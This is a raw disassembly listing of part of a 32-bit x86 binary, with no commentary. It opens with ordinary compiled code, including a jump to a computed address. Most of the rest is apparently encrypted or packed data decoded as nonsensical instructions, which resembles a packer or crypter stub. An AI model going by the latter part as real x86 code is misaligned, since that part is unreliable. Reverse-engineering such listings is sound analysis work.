  4153e5:	cmp    DWORD PTR [ebp-0x4],0x0
  4153e9:	jne    0x415403
  4153eb:	push   0x0
  4153ed:	push   0x0
  4153ef:	call   0x416aac
  4153f4:	push   0x0
  4153f6:	call   DWORD PTR ds:0x417040
  4153fc:	mov    BYTE PTR ds:0x42fed0,0x0
  415403:	mov    ecx,DWORD PTR [ebp-0x4]
  415406:	add    ecx,DWORD PTR [ebp-0x14]
  415409:	mov    edx,DWORD PTR [ebp-0x8]
  41540c:	mov    DWORD PTR [ecx],edx
  41540e:	mov    eax,DWORD PTR [ebp-0x4]
  415411:	add    eax,DWORD PTR [ebp-0x54]
  415414:	mov    DWORD PTR [ebp-0x5c],eax
  415417:	mov    ecx,DWORD PTR ds:0x417038
  41541d:	mov    DWORD PTR [ebp-0x4c],ecx
  415420:	mov    edx,DWORD PTR [ebp-0x4]
  415423:	add    edx,DWORD PTR [ebp-0x14]
  415426:	mov    eax,DWORD PTR [ebp+0x8]
  415429:	mov    DWORD PTR [edx+0x4],eax
  41542c:	mov    ecx,DWORD PTR [ebp-0x4]
  41542f:	add    ecx,DWORD PTR [ebp-0x14]
  415432:	mov    DWORD PTR [ebp-0xc],ecx
  415435:	cmp    DWORD PTR [ebp-0x68],0x0
  415439:	jbe    0x415456
  41543b:	mov    edx,DWORD PTR [ebp-0xc]
  41543e:	push   edx
  41543f:	mov    eax,DWORD PTR [ebp-0x14]
  415442:	push   eax
  415443:	mov    ecx,DWORD PTR [ebp-0x2c]
  415446:	add    ecx,DWORD PTR [ebp-0x68]
  415449:	push   ecx
  41544a:	mov    edx,DWORD PTR [ebp-0x4]
  41544d:	push   edx
  41544e:	call   0x4169bf
  415453:	add    esp,0x10
  415456:	cmp    DWORD PTR [ebp-0x5c],0x0
  41545a:	je     0x41546a
  41545c:	push   DWORD PTR [ebp-0x4c]
  41545f:	push   DWORD PTR [ebp-0x6c]
  415462:	mov    edx,DWORD PTR [ebp-0x5c]
  415465:	push   eax
  415466:	jmp    edx
  415468:	jmp    0x415470
  41546a:	mov    eax,DWORD PTR [ebp+0x8]
  41546d:	mov    DWORD PTR [ebp-0x18],eax
  415470:	mov    eax,0x1
  415475:	mov    esp,ebp
  415477:	pop    ebp
  415478:	ret    
  415479:	push   ebp
  41547a:	mov    ebp,esp
  41547c:	pop    ebp
  41547d:	ret    
  41547e:	push   ebp
  41547f:	mov    ebp,esp
  415481:	sub    esp,0x54
  415484:	mov    DWORD PTR [ebp-0x34],0x0
  41548b:	mov    DWORD PTR [ebp-0x4],0x0
  415492:	mov    DWORD PTR [ebp-0x50],0x0
  415499:	mov    DWORD PTR [ebp-0x4c],0x0
  4154a0:	mov    DWORD PTR [ebp-0x30],0x0
  4154a7:	lea    eax,[ebp-0x48]
  4154aa:	push   eax
  4154ab:	call   DWORD PTR ds:0x417028
  4154b1:	mov    ecx,DWORD PTR [ebp-0x34]
  4154b4:	push   ecx
  4154b5:	call   0x4154e4
  4154ba:	add    esp,0x4
  4154bd:	call   0x4169b0
  4154c2:	mov    DWORD PTR [ebp-0x54],0x0
  4154c9:	jmp    0x4154d4
  4154cb:	mov    edx,DWORD PTR [ebp-0x54]
  4154ce:	add    edx,0x1
  4154d1:	mov    DWORD PTR [ebp-0x54],edx
  4154d4:	cmp    DWORD PTR [ebp-0x54],0x64
  4154d8:	jae    0x4154dc
  4154da:	jmp    0x4154cb
  4154dc:	xor    eax,eax
  4154de:	mov    esp,ebp
  4154e0:	pop    ebp
  4154e1:	ret    0x10
  4154e4:	push   ebp
  4154e5:	mov    ebp,esp
  4154e7:	sub    esp,0x3c
  4154ea:	push   esi
  4154eb:	mov    DWORD PTR [ebp-0x3c],0x0
  4154f2:	mov    DWORD PTR [ebp-0x38],0x0
  4154f9:	mov    DWORD PTR [ebp-0x30],0x0
  415500:	mov    DWORD PTR [ebp-0x24],0x0
  415507:	mov    DWORD PTR [ebp-0x1c],0x0
  41550e:	mov    DWORD PTR [ebp-0x28],0x0
  415515:	mov    DWORD PTR [ebp-0x2c],0x449408
  41551c:	mov    DWORD PTR [ebp-0x24],0x81701bf3
  415523:	mov    DWORD PTR [ebp-0x34],0x0
  41552a:	mov    eax,DWORD PTR [ebp-0x24]
  41552d:	mov    DWORD PTR [ebp-0x20],eax
  415530:	mov    DWORD PTR [ebp-0x4],0x0
  415537:	mov    ecx,DWORD PTR ds:0x41702c
  41553d:	mov    DWORD PTR [ebp-0x4],ecx
  415540:	push   0x0
  415542:	push   0x4e
  415544:	push   0x1e
  415546:	push   0x0
  415548:	push   0xffffffff
  41554a:	call   DWORD PTR ds:0x417034
  415550:	test   eax,eax
  415552:	je     0x41698f
  415558:	xlat   BYTE PTR ds:[ebx]
  415559:	ret    0x5d6f
  41555c:	jecxz  0x4155bb
  41555e:	mov    dh,0x4f
  415560:	addr16 push ecx
  415562:	mov    ah,0xd0
  415564:	es gs cwde 
  415567:	jmp    ebp
  415569:	loopne 0x4155c8
  41556b:	mov    dh,0x4f
  41556d:	arpl   WORD PTR [ecx-0x4c],dx
  415570:	nop
  415571:	fstp   DWORD PTR [edx-0x1fa20068]
  415577:	pop    ebp
  415578:	mov    dh,0x4f
  41557a:	arpl   WORD PTR [ecx-0x4c],dx
  41557d:	rcr    cl,1
  41557f:	call   0xb65d:0xe05dff98
  415586:	dec    edi
  415587:	arpl   WORD PTR [ecx-0x4c],dx
  41558a:	rcr    cl,1
  41558c:	call   0xb65d:0xe05dff98
  415593:	dec    edi
  415594:	imul   edx,DWORD PTR [eax-0x4c],0xffffffd0
  415598:	xlat   BYTE PTR ds:[ebx]
  415599:	test   DWORD PTR [edx],esp
  41559b:	icebp  
  41559c:	pop    ebp
  41559d:	push   esp
  41559e:	push   esp
  41559f:	jnp    0x41560f
  4155a1:	fist   DWORD PTR [eax-0x8]
  4155a4:	sbb    eax,0x96f0cef8
  4155a9:	shr    BYTE PTR cs:0x230420c4,0xd5
  4155b1:	mov    ebp,0x91f9f9f9
  4155b6:	xor    ecx,DWORD PTR [edi+0x62d9629]
  4155bc:	jno    0x415584
  4155be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155bf:	mov    bh,0xba
  4155c1:	icebp  
  4155c2:	xchg   ecx,eax
  4155c3:	jge    0x415569
  4155c5:	adc    ah,ch
  4155c7:	outs   dx,DWORD PTR ds:[esi]
  4155c8:	push   cs
  4155c9:	shl    BYTE PTR ds:[ebp-0xa6a6809],1
  4155d0:	jns    0x4155b2
  4155d2:	pop    ebp
  4155d3:	mov    dh,0x4f
  4155d5:	arpl   WORD PTR [ecx-0x4c],dx
  4155d8:	stos   BYTE PTR es:[edi],al
  4155d9:	push   ss
  4155da:	mov    WORD PTR [esi],ss
  4155dc:	shl    ebx,0x98
  4155df:	or     BYTE PTR [eax-0x7573e41f],0x7e
  4155e6:	mov    eax,ds:0xbbccbd47
  4155eb:	cmp    eax,0xbe37187f
  4155f0:	je     0x415579
  4155f2:	add    al,BYTE PTR [eiz*1-0x3a7f78ca]
  4155f9:	outs   dx,BYTE PTR ds:[esi]
  4155fa:	gs xchg edx,eax
  4155fc:	jbe    0x4155fd
  4155fe:	int3   
  4155ff:	or     eax,0x224b4288
  415604:	dec    si
  415606:	and    eax,0xaab5786b
  41560b:	imul   esp,edi,0xc845e277
  415611:	mov    ecx,DWORD PTR [ebx]
  415613:	adc    BYTE PTR [ebx-0x7573e41f],0x7e
  41561a:	mov    al,ds:0x2550d147
  41561f:	cmp    eax,0xbe25389f
  415624:	popa   
  415625:	sbb    ch,BYTE PTR [eax+0x28abbf04]
  41562b:	sbb    BYTE PTR [ecx+0x4692cef3],0x62
  415632:	push   esi
  415633:	or     eax,0x22e034e6
  415638:	js     0x41560d
  41563a:	mov    eax,0x29cd706b
  41563f:	imul   eax,DWORD PTR [edx-0x3e0f0650],0xb68098f3
  415649:	dec    edi
  41564a:	arpl   WORD PTR [ecx-0x4c],dx
  41564d:	rcr    cl,1
  41564f:	call   0xb65d:0xe05dff98
  415656:	dec    edi
  415657:	arpl   WORD PTR [ecx-0x4c],dx
  41565a:	rcr    cl,1
  41565c:	call   0xb618:0xb05dff98
  415663:	dec    edi
  415664:	das    
  415665:	push   eax
  415666:	mov    bh,0xd0
  415668:	mov    edi,0x5db0d5d4
  41566d:	loopne 0x4156cc
  41566f:	mov    dh,0x4f
  415671:	arpl   WORD PTR [ecx-0x4c],dx
  415674:	xor    cl,bl
  415676:	cwde   
  415677:	cdq    
  415678:	hlt    
  415679:	pop    esp
  41567a:	jmp    0xb451:0x67adb65d
  415681:	push   esp
  415682:	fistp  WORD PTR [edx-0x1fa20068]
  415688:	push   ds
  415689:	or     ecx,DWORD PTR [edi+0x63]
  41568c:	push   ecx
  41568d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41568e:	rcr    cl,1
  415690:	call   0xf65d:0xe05dfa98
  415697:	dec    edi
  415698:	arpl   WORD PTR [ecx-0x4c],ax
  41569b:	rcr    cl,1
  41569d:	cwde   
  41569e:	cwde   
  41569f:	call   FWORD PTR [eax-0x20]
  4156a2:	pop    esp
  4156a3:	mov    dh,0x4f
  4156a5:	arpl   WORD PTR [ecx-0x4c],dx
  4156a8:	aad    0xd9
  4156aa:	fwait
  4156ab:	cwde   
  4156ac:	call   FWORD PTR [ebp-0x20]
  4156af:	pop    ebp
  4156b0:	mov    dh,0x7f
  4156b2:	outs   dx,DWORD PTR ds:[esi]
  4156b3:	push   ecx
  4156b4:	mov    ah,0xd4
  4156b6:	fstp   DWORD PTR [edx-0x1fa6fe6e]
  4156bc:	pop    edi
  4156bd:	mov    dh,0xf
  4156bf:	loop   0x415712
  4156c1:	mov    ah,0xc0
  4156c3:	fstp   DWORD PTR [edx-0x1fa20078]
  4156c9:	pop    ebp
  4156ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156cb:	dec    edi
  4156cc:	arpl   WORD PTR [ecx-0x4c],ax
  4156cf:	rcr    cl,1
  4156d1:	call   0xb65d:0xe04dff98
  4156d8:	dec    edi
  4156d9:	arpl   WORD PTR [ecx-0x4c],dx
  4156dc:	rcr    cl,1
  4156de:	call   0xef5d:0xec5dfb98
  4156e5:	dec    esp
  4156e6:	arpl   WORD PTR [ecx-0x4c],dx
  4156e9:	adc    dl,dl
  4156eb:	call   0xb65d:0xe05dc0cd
  4156f2:	dec    edi
  4156f3:	arpl   WORD PTR [ecx-0x4c],dx
  4156f6:	rcr    cl,1
  4156f8:	call   0xb65d:0xe05dff98
  4156ff:	dec    edi
  415700:	arpl   WORD PTR [ecx-0x48],si
  415703:	rol    cl,1
  415705:	call   0xb65d:0xe05dff98
  41570c:	dec    edi
  41570d:	arpl   WORD PTR [ecx-0x4c],dx
  415710:	rcr    cl,1
  415712:	call   0xb65d:0xe05dff98
  415719:	dec    edi
  41571a:	arpl   WORD PTR [ecx-0x4c],dx
  41571d:	rcr    cl,1
  41571f:	call   0xb65d:0xe05dff98
  415726:	dec    edi
  415727:	arpl   WORD PTR [ecx-0x4c],dx
  41572a:	rcr    cl,1
  41572c:	call   0xb65d:0xe05dff98
  415733:	dec    edi
  415734:	arpl   WORD PTR [ecx-0x4c],dx
  415737:	rcr    cl,1
  415739:	call   0xb65d:0xe05dff98
  415740:	dec    edi
  415741:	arpl   WORD PTR [ecx-0x4c],dx
  415744:	rcr    cl,1
  415746:	call   0xb65d:0xe05dff98
  41574d:	dec    edi
  41574e:	arpl   WORD PTR [ecx-0x4c],dx
  415751:	rcr    cl,1
  415753:	call   0xc273:0xe05dff98
  41575a:	sub    bl,BYTE PTR [ebx]
  41575c:	and    eax,0x9ad9d0b4
  415761:	sub    ah,dh
  415763:	pop    ebp
  415764:	loopne 0x4157b3
  415766:	mov    dh,0x4f
  415768:	arpl   WORD PTR [edi],si
  41576a:	mov    al,0xd0
  41576c:	fstp   DWORD PTR [esi-0x5af20068]
  415772:	push   ds
  415773:	test   BYTE PTR [ebx],bl
  415775:	sub    al,0x51
  415777:	mov    ah,0xd0
  415779:	fstp   DWORD PTR [edx-0x1fa22068]
  41577f:	mov    ebp,0x23103d98
  415784:	xlat   BYTE PTR ds:[ebx]
  415785:	rcr    cl,1
  415787:	call   0x765d:0xe05d9f98
  41578e:	inc    esp
  41578f:	arpl   WORD PTR [ecx-0x1a],dx
  415792:	rcr    cl,1
  415794:	call   0xb65d:0xe05dfbf2
  41579b:	dec    edi
  41579c:	arpl   WORD PTR [ecx-0x4c],dx
  41579f:	rcr    cl,1
  4157a1:	call   0x565d:0xe07dff98
  4157a8:	popa   
  4157a9:	adc    DWORD PTR [eax+ebx*8],esi
  4157ac:	mov    edi,0xff989aba
  4157b1:	pop    edi
  4157b2:	loopne 0x415811
  4157b4:	mov    dh,0x6f
  4157b6:	outs   dx,DWORD PTR ds:[esi]
  4157b7:	push   ecx
  4157b8:	mov    ah,0xd2
  4157ba:	fstp   DWORD PTR [edx-0x1fa6bc68]
  4157c0:	pop    ebp
  4157c1:	mov    dh,0x4f
  4157c3:	arpl   WORD PTR [ecx-0x4c],dx
  4157c6:	rcr    cl,1
  4157c8:	call   0xb65d:0xa05dff98
  4157cf:	(bad)  
  4157d0:	arpl   WORD PTR [ecx-0x4c],dx
  4157d3:	rcr    cl,1
  4157d5:	call   0xb65d:0xe05dff98
  4157dc:	dec    edi
  4157dd:	arpl   WORD PTR [ecx-0x4c],dx
  4157e0:	rcr    cl,1
  4157e2:	call   0xb65d:0xe05dff98
  4157e9:	dec    edi
  4157ea:	arpl   WORD PTR [ecx-0x4c],dx
  4157ed:	rcr    cl,1
  4157ef:	call   0xb65d:0xe05dff98
  4157f6:	dec    edi
  4157f7:	arpl   WORD PTR [ecx-0x4c],dx
  4157fa:	rcr    cl,1
  4157fc:	call   0xb65d:0xe05dff98
  415803:	dec    edi
  415804:	arpl   WORD PTR [ecx-0x4c],dx
  415807:	rcr    cl,1
  415809:	call   0xb65d:0xe05dff98
  415810:	dec    edi
  415811:	arpl   WORD PTR [ecx-0x4c],dx
  415814:	rcr    cl,1
  415816:	call   0xb65d:0xe05dff98
  41581d:	dec    edi
  41581e:	arpl   WORD PTR [ecx-0x4c],dx
  415821:	rcr    cl,1
  415823:	call   0xb65d:0xe05dff98
  41582a:	dec    edi
  41582b:	arpl   WORD PTR [ecx-0x4c],dx
  41582e:	rcr    cl,1
  415830:	call   0xb65d:0xe05dff98
  415837:	dec    edi
  415838:	arpl   WORD PTR [ecx-0x4c],dx
  41583b:	rcr    cl,1
  41583d:	call   0xb65d:0xe05dff98
  415844:	dec    edi
  415845:	arpl   WORD PTR [ecx-0x4c],dx
  415848:	rcr    cl,1
  41584a:	call   0xb65d:0xe05dff98
  415851:	dec    edi
  415852:	arpl   WORD PTR [ecx-0x4c],dx
  415855:	rcr    cl,1
  415857:	call   0xb65d:0xe05dff98
  41585e:	dec    edi
  41585f:	arpl   WORD PTR [ecx-0x4c],dx
  415862:	rcr    cl,1
  415864:	call   0xb65d:0xe05dff98
  41586b:	dec    edi
  41586c:	arpl   WORD PTR [ecx-0x4c],dx
  41586f:	rcr    cl,1
  415871:	call   0xb65d:0xe05dff98
  415878:	dec    edi
  415879:	arpl   WORD PTR [ecx-0x4c],dx
  41587c:	rcr    cl,1
  41587e:	call   0xb65d:0xe05dff98
  415885:	dec    edi
  415886:	arpl   WORD PTR [ecx-0x4c],dx
  415889:	rcr    cl,1
  41588b:	call   0xb65d:0xe05dff98
  415892:	dec    edi
  415893:	arpl   WORD PTR [ecx-0x4c],dx
  415896:	rcr    cl,1
  415898:	call   0xb65d:0xe05dff98
  41589f:	dec    edi
  4158a0:	arpl   WORD PTR [ecx-0x4c],dx
  4158a3:	rcr    cl,1
  4158a5:	call   0xb65d:0xe05dff98
  4158ac:	dec    edi
  4158ad:	arpl   WORD PTR [ecx-0x4c],dx
  4158b0:	rcr    cl,1
  4158b2:	call   0xb65d:0xe05dff98
  4158b9:	dec    edi
  4158ba:	arpl   WORD PTR [ecx-0x4c],dx
  4158bd:	rcr    cl,1
  4158bf:	call   0xb65d:0xe05dff98
  4158c6:	dec    edi
  4158c7:	arpl   WORD PTR [ecx-0x4c],dx
  4158ca:	rcr    cl,1
  4158cc:	call   0xb65d:0xe05dff98
  4158d3:	dec    edi
  4158d4:	arpl   WORD PTR [ecx-0x4c],dx
  4158d7:	rcr    cl,1
  4158d9:	call   0xb65d:0xe05dff98
  4158e0:	dec    edi
  4158e1:	arpl   WORD PTR [ecx-0x4c],dx
  4158e4:	rcr    cl,1
  4158e6:	call   0xb65d:0xe05dff98
  4158ed:	dec    edi
  4158ee:	arpl   WORD PTR [ecx-0x4c],dx
  4158f1:	rcr    cl,1
  4158f3:	call   0xb65d:0xe05dff98
  4158fa:	dec    edi
  4158fb:	arpl   WORD PTR [ecx-0x4c],dx
  4158fe:	rcr    cl,1
  415900:	call   0xb65d:0xe05dff98
  415907:	dec    edi
  415908:	arpl   WORD PTR [ecx-0x4c],dx
  41590b:	rcr    cl,1
  41590d:	call   0xb65d:0xe05dff98
  415914:	dec    edi
  415915:	arpl   WORD PTR [ecx-0x4c],dx
  415918:	rcr    cl,1
  41591a:	call   0xb65d:0xe05dff98
  415921:	dec    edi
  415922:	arpl   WORD PTR [ecx-0x4c],dx
  415925:	rcr    cl,1
  415927:	call   0xb65d:0xe05dff98
  41592e:	dec    edi
  41592f:	arpl   WORD PTR [ecx-0x4c],dx
  415932:	rcr    cl,1
  415934:	call   0xb65d:0xe05dff98
  41593b:	dec    edi
  41593c:	arpl   WORD PTR [ecx-0x4c],dx
  41593f:	rcr    cl,1
  415941:	call   0xb65d:0xe05dff98
  415948:	dec    edi
  415949:	arpl   WORD PTR [ecx-0x4c],dx
  41594c:	rcr    cl,1
  41594e:	call   0xb65d:0xe05dff98
  415955:	dec    edi
  415956:	arpl   WORD PTR [ecx+0x1f],dx
  415959:	sahf   
  41595a:	rcr    BYTE PTR [edx-0xfa20049],cl
  415960:	pop    ebp
  415961:	mov    dh,0x65
  415963:	ror    DWORD PTR [ebx-0x56699240],0x8a
  41596a:	aam    0x66
  41596c:	fnsave [edx+0x1865dd03]
  415972:	in     eax,dx
  415973:	and    DWORD PTR ds:0x66b88b29,eax
  415979:	or     DWORD PTR [ebp-0x6cedf2c3],eax
  41597f:	dec    esi
  415980:	lahf   
  415981:	dec    esi
  415982:	les    eax,FWORD PTR [edi+0x2b]
  415985:	sbb    eax,0xf4553083
  41598a:	mov    dl,0x74
  41598c:	neg    ecx
  41598e:	push   ecx
  41598f:	sbb    cl,BYTE PTR [edi+0x65d97d02]
  415995:	cmc    
  415996:	dec    ebp
  415997:	das    
  415998:	push   ss
  415999:	ins    BYTE PTR es:[edi],dx
  41599a:	dec    esp
  41599b:	push   cs
  41599c:	aad    0xa6
  41599e:	dec    esp
  41599f:	stos   DWORD PTR es:[edi],eax
  4159a0:	adc    al,0x44
  4159a2:	mov    eax,ds:0xdb039201
  4159a7:	dec    esp
  4159a8:	mov    al,BYTE PTR ds:[edi]
  4159ab:	maskmovq mm3,mm2
  4159ae:	lock xor eax,DWORD PTR [edi+ebx*4]
  4159b2:	sti    
  4159b3:	pop    ebx
  4159b4:	ss clc 
  4159b6:	or     eax,0xc7c61e44
  4159bb:	jae    0x92e57d0c
  4159c1:	mov    ah,0x64
  4159c3:	jne    0x4159aa
  4159c5:	(bad)  
  4159c6:	or     BYTE PTR [edi-0x57],dl
  4159c9:	retf   0x7b1e
  4159cc:	dec    ecx
  4159cd:	mov    eax,ds:0xbc107bb5
  4159d2:	fmul   st(7),st
  4159d4:	add    al,0xc6
  4159d6:	aam    0x34
  4159d8:	jp     0x41598c
  4159da:	and    esi,esp
  4159dc:	mov    WORD PTR [edx],cs
  4159de:	xor    ecx,DWORD PTR ds:0x903b92c0
  4159e4:	sbb    ebp,edi
  4159e6:	aad    0x21
  4159e8:	xchg   edi,eax
  4159e9:	push   eax
  4159ea:	arpl   WORD PTR [eax+eax*8-0x65d48583],bp
  4159f1:	pop    esp
  4159f2:	nop
  4159f3:	xchg   BYTE PTR [ecx-0x45233c02],al
  4159f9:	add    al,0x5
  4159fb:	sub    dl,BYTE PTR [ecx+edi*2+0x589fc9bc]
  415a02:	add    eax,0x3eecc6ed
  415a07:	inc    eax
  415a08:	fstp   QWORD PTR [ecx-0x1af41963]
  415a0e:	pop    esp
  415a0f:	pop    ebp
  415a10:	push   ecx
  415a11:	pop    edi
  415a12:	dec    edi
  415a13:	fdiv   QWORD PTR [ecx]
  415a15:	sar    dl,1
  415a17:	push   ds
  415a18:	push   ss
  415a19:	shl    BYTE PTR [esi-0x3a96c2d9],0x8b
  415a20:	je     0x415a98
  415a22:	cmp    eax,0xaa386ff5
  415a27:	add    DWORD PTR [esi],ecx
  415a29:	inc    ecx
  415a2a:	fcom   DWORD PTR [edx-0x5]
  415a2d:	pop    edi
  415a2e:	fldln2 
  415a30:	ss inc esp
  415a32:	dec    edx
  415a33:	inc    ecx
  415a34:	ds inc eax
  415a36:	dec    edx
  415a37:	xor    ch,BYTE PTR [ebp+0x91c26fb]
  415a3d:	aad    0x5e
  415a3f:	or     edi,0x4e
  415a42:	xor    al,0x5e
  415a44:	inc    ecx
  415a45:	jl     0x4159f7
  415a47:	jns    0x4159ca
  415a49:	fstp   QWORD PTR [ebx]
  415a4b:	mov    DWORD PTR [ecx+0x7cdff6d9],0x20b57c13
  415a55:	ins    DWORD PTR es:[edi],dx
  415a56:	xor    al,0x78
  415a58:	jb     0x415a3d
  415a5a:	(bad)  
  415a5b:	retf   
  415a5c:	dec    edx
  415a5d:	aas    
  415a5e:	in     al,dx
  415a5f:	xor    eax,0xe2b7fe8b
  415a64:	popf   
  415a65:	adc    esi,ecx
  415a67:	mov    eax,ds:0x13d014b4
  415a6c:	mov    al,0x54
  415a6e:	in     al,dx
  415a6f:	arpl   WORD PTR [edi+0x2ee46c14],dx
  415a75:	data16 fldcw WORD PTR [edi+0x67]
  415a79:	dec    ecx
  415a7a:	inc    esi
  415a7b:	push   0xffffff88
  415a7d:	sbb    BYTE PTR [edi+ecx*2-0x3a],0xa2
  415a82:	xchg   ecx,eax
  415a83:	add    al,0xb9
  415a85:	jl     0x415a5d
  415a87:	cld    
  415a88:	and    eax,0xe0553d1a
  415a8d:	mov    ecx,0xcc75701
  415a92:	dec    ecx
  415a93:	fidivr WORD PTR [ebx+0xd]
  415a96:	lods   al,BYTE PTR ds:[esi]
  415a97:	or     al,0x9
  415a99:	rol    BYTE PTR [edx-0x589b1f21],0xc9
  415aa0:	mov    WORD PTR ds:0x6900e52c,ss
  415aa6:	sub    eax,DWORD PTR [edi+eiz*1]
  415aa9:	xchg   ebx,eax
  415aaa:	pop    edi
  415aab:	jle    0x415a5b
  415aad:	out    dx,eax
  415aae:	jp     0x415acc
  415ab0:	add    eax,0x60ee8326
  415ab5:	out    dx,al
  415ab6:	fisttp WORD PTR [edx+0x4274a5]
  415abc:	or     DWORD PTR gs:[ebx+edi*4-0x2013c4a6],esp
  415ac4:	xchg   ebx,eax
  415ac5:	mov    eax,0x74480190
  415aca:	adc    bl,BYTE PTR [eax]
  415acc:	jmp    0x415a9c
  415ace:	jb     0x415b2c
  415ad0:	or     esp,DWORD PTR [eax+esi*2-0x42]
  415ad4:	jb     0x415b4c
  415ad6:	lods   eax,DWORD PTR ds:[esi]
  415ad7:	and    dh,ah
  415ad9:	mov    bl,0xe7
  415adb:	cmp    eax,DWORD PTR [ecx-0x32f2d07f]
  415ae1:	pop    es
  415ae2:	jne    0x415af1
  415ae4:	repz scas eax,DWORD PTR es:[edi]
  415ae6:	mov    al,ds:0x19082c0
  415aeb:	test   BYTE PTR [ecx],cl
  415aed:	cmp    eax,0xc413b751
  415af2:	pop    ds
  415af3:	mov    ebx,0x52db9bcd
  415af8:	neg    BYTE PTR [edx]
  415afa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415afb:	dec    ebx
  415afc:	sar    DWORD PTR [ecx+ebx*8],1
  415aff:	daa    
  415b00:	iret   
  415b01:	jnp    0x415acb
  415b03:	out    0x48,eax
  415b05:	call   0x6a3fcebe
  415b0a:	push   edi
  415b0b:	out    dx,eax
  415b0c:	and    esp,DWORD PTR [ebx]
  415b0e:	xor    eax,0xe9d389b1
  415b13:	cs jg  0x415aae
  415b16:	cmp    al,0xa7
  415b18:	sub    al,al
  415b1a:	pop    ebp
  415b1b:	arpl   WORD PTR [ebp-0x3150c9cc],sp
  415b21:	scas   eax,DWORD PTR es:[edi]
  415b22:	mov    DWORD PTR cs:[ebp-0x607cb400],0x8d50b4f3
  415b2d:	push   es
  415b2e:	aaa    
  415b2f:	fiadd  DWORD PTR [ebx-0x5ccbb670]
  415b35:	call   0x47d8:0xba669d19
  415b3c:	add    al,ah
  415b3e:	fcmovnu st,st(5)
  415b40:	loop   0x415b85
  415b42:	js     0x415add
  415b44:	out    0x44,eax
  415b46:	popa   
  415b47:	mov    esi,DWORD PTR [ebx-0x53]
  415b4a:	mov    dh,BYTE PTR [eax]
  415b4c:	pop    edx
  415b4d:	call   0x170c:0x4f8ab6b7
  415b54:	into   
  415b55:	dec    cl
  415b57:	jae    0x736435ea
  415b5d:	mov    ebp,0x1521e280
  415b62:	clc    
  415b63:	leave  
  415b64:	push   0xbc0dd625
  415b69:	(bad)  
  415b6a:	mov    al,0xb5
  415b6c:	mov    ?,WORD PTR [ecx-0x1add7594]
  415b72:	je     0x415bb3
  415b74:	fisubr DWORD PTR [ecx-0x41]
  415b77:	cmc    
  415b78:	mul    ah
  415b7a:	addr16 pop edx
  415b7c:	fadd   QWORD PTR [ebx+0x4f]
  415b7f:	xchg   edx,eax
  415b80:	inc    esi
  415b81:	mov    ebx,0x20abb9b7
  415b86:	out    dx,al
  415b87:	xchg   ecx,eax
  415b88:	or     al,0x39
  415b8a:	or     ebx,DWORD PTR [ebx+0x37]
  415b8d:	sbb    eax,0x3c768ea1
  415b92:	aas    
  415b93:	loop   0x415b3c
  415b95:	jns    0x415bfa
  415b97:	xor    BYTE PTR [esp+eax*1+0x7c],ah
  415b9b:	jbe    0x415b20
  415b9d:	mov    dh,0x38
  415b9f:	loopne 0x415c16
  415ba1:	mov    ebp,0x3eb19c39
  415ba6:	dec    esp
  415ba7:	lds    ebx,FWORD PTR [ebx-0x40]
  415baa:	xchg   ecx,eax
  415bab:	fsubr  DWORD PTR [esi-0x55dcf3c2]
  415bb1:	jg     0x415c24
  415bb3:	mov    ecx,0xd2abb22d
  415bb8:	xchg   esi,eax
  415bb9:	pop    ss
  415bba:	arpl   WORD PTR [edi-0x3],si
  415bbd:	mov    ecx,0xa06cb5d4
  415bc2:	sbb    al,0xe4
  415bc4:	or     bl,BYTE PTR [edx-0x29]
  415bc7:	xchg   edx,eax
  415bc8:	sub    cl,BYTE PTR [ecx]
  415bca:	scas   eax,DWORD PTR es:[edi]
  415bcb:	rcl    BYTE PTR cs:[ebp-0x1ee6d93],cl
  415bd2:	(bad)  
  415bd3:	(bad)  
  415bd4:	aam    0xd7
  415bd6:	adc    ebp,esi
  415bd8:	pop    eax
  415bd9:	or     DWORD PTR [edx+edx*2+0xbd3fc85],edx
  415be0:	aas    
  415be1:	jge    0x415bd7
  415be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415be4:	mov    edx,0x83df1fa1
  415be9:	pop    eax
  415bea:	lahf   
  415beb:	sbb    BYTE PTR [edi-0x3d],dl
  415bee:	cmp    eax,0x58a23e60
  415bf3:	mov    bh,0x8a
  415bf5:	mov    DWORD PTR [esi],edx
  415bf7:	push   ebp
  415bf8:	in     al,dx
  415bf9:	mov    edx,0x3e446268
  415bfe:	retf   0x3550
  415c01:	hlt    
  415c02:	pop    esp
  415c03:	xor    bh,0x8e
  415c06:	inc    ebp
  415c07:	inc    esp
  415c08:	mov    dh,0xb0
  415c0a:	rcl    DWORD PTR [edx+0x39],0xc2
  415c0e:	test   eax,0x90cda6e2
  415c13:	cli    
  415c14:	stos   BYTE PTR es:[edi],al
  415c15:	leave  
  415c16:	dec    esp
  415c17:	cmp    BYTE PTR [edi+eax*1-0x60e1263c],dh
  415c1e:	(bad)  
  415c1f:	fcomp  QWORD PTR [ebp-0x5689038c]
  415c25:	sub    DWORD PTR [edx+0x33],ecx
  415c28:	rcl    BYTE PTR [edi-0x6f],1
  415c2b:	test   eax,0x4a53c9d9
  415c30:	ret    
  415c31:	cwde   
  415c32:	xor    bh,dh
  415c34:	mov    al,ds:0xb416a50f
  415c39:	loop   0x415bde
  415c3b:	or     ebp,DWORD PTR [esi-0x4d8fce2c]
  415c41:	jns    0x415c83
  415c43:	xchg   ebp,eax
  415c44:	pop    esp
  415c45:	mov    ebx,cs
  415c47:	mov    eax,0xafd30f04
  415c4c:	dec    ebx
  415c4d:	imul   edx,DWORD PTR [edi-0x31a2ef86],0x1
  415c54:	bound  ebp,QWORD PTR [edx+0xe650da8]
  415c5a:	mov    dl,0x19
  415c5c:	dec    eax
  415c5d:	push   edx
  415c5e:	(bad)  
  415c5f:	mov    ds:0x7e80c6fa,eax
  415c64:	cmc    
  415c65:	shl    DWORD PTR [ecx+0x5f38d573],1
  415c6b:	je     0x415ce1
  415c6d:	hlt    
  415c6e:	xchg   edx,eax
  415c6f:	dec    edi
  415c70:	ficomp DWORD PTR [edi-0x5ef5e948]
  415c76:	push   edx
  415c77:	mov    bl,0xb4
  415c79:	fistp  QWORD PTR ss:[ecx-0x6d]
  415c7d:	dec    eax
  415c7e:	in     al,dx
  415c7f:	call   0x3e26:0xf03df5ab
  415c86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c87:	pop    edi
  415c88:	mov    ebp,0xeb305a6d
  415c8d:	in     al,0x11
  415c8f:	in     eax,dx
  415c90:	das    
